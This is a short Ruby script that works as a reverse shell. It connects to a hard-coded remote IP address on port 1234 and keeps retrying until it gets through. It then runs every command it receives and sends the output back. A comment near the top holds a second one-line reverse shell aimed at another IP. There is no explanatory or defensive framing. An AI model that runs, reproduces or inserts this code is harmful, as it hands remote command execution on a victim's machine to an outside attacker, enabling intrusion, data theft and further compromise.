#!/usr/bin/env ruby

require 'socket'
require 'open3'

# c=TCPSocket.new("45.78.38.107","1234");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend

#Set the Remote Host IP
RHOST = "132.232.23.92" 
#Set the Remote Host Port
PORT = "1234"

puts "#{RHOST}"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  puts "retry after 10s ..."
  sleep 10
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end 